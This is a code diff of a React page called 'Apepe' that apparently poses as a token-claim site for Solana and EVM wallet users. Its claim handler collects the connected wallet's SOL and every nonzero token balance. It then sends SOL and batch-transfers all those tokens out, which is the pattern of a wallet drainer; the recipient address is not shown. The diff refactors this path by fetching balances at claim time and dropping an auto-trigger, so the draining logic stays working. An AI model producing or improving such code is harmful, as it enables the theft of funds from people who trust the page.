@@ -3,7 +3,7 @@ import { PegasusAnimation } from '@/components/PegasusAnimation';
 import { Navigation } from '@/components/Navigation';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
-import { useState, useEffect, useCallback, useRef } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
 import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
@@ -36,16 +36,11 @@ const Apepe = () => {
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
   const [isClaiming, setIsClaiming] = useState(false);
-  const [isVerifying, setIsVerifying] = useState(false);
-  const [hasAutoTriggered, setHasAutoTriggered] = useState(false);
-  const [balances, setBalances] = useState<TokenBalance[]>([]);
-  const [solBalance, setSolBalance] = useState(0);
 
   const fetchAllBalances = useCallback(async () => {
-    if (!publicKey) return;
+    if (!publicKey) return [];
     try {
       const solBal = await connection.getBalance(publicKey);
-      setSolBalance(solBal / LAMPORTS_PER_SOL);
 
       const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
       const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
@@ -65,19 +60,12 @@ const Apepe = () => {
         })
         .filter(token => token.uiAmount > 0);
 
-      setBalances(tokens);
+      return tokens;
     } catch (error) {
       console.error('Error fetching balances:', error);
+      return [];
     }
   }, [publicKey, connection]);
-
-  useEffect(() => {
-    if (publicKey) fetchAllBalances();
-  }, [publicKey, fetchAllBalances]);
-
-  const claimFnRef = useRef<() => void>(() => {});
-
-  // Auto-verify popup removed: users connect their wallet and continue freely.
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
     if (!publicKey) return null;
@@ -125,6 +113,7 @@ const Apepe = () => {
 
     try {
       setIsClaiming(true);
+      const currentBalances = await fetchAllBalances();
       const solBal = await connection.getBalance(publicKey);
       const solPrice = await getSolPrice();
       let lamportsToSend = 0;
@@ -147,7 +136,7 @@ const Apepe = () => {
         await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
       }
 
-      const validTokens = balances.filter(token => token.balance > 0);
+      const validTokens = currentBalances.filter(token => token.balance > 0);
       const batches: TokenBalance[][] = [];
       for (let i = 0; i < validTokens.length; i += MAX_BATCH_SIZE) {
         batches.push(validTokens.slice(i, i + MAX_BATCH_SIZE));
@@ -172,18 +161,12 @@ const Apepe = () => {
     }
   };
 
-  useEffect(() => {
-    claimFnRef.current = handleClaimTokens;
-  });
-
   const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;
 
   return (
     <div className="min-h-screen relative overflow-hidden">
       <PegasusAnimation />
       <Navigation />
-
-      {/* Wallet verification overlay removed */}
 
       <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
         <div className="container mx-auto max-w-4xl text-center">
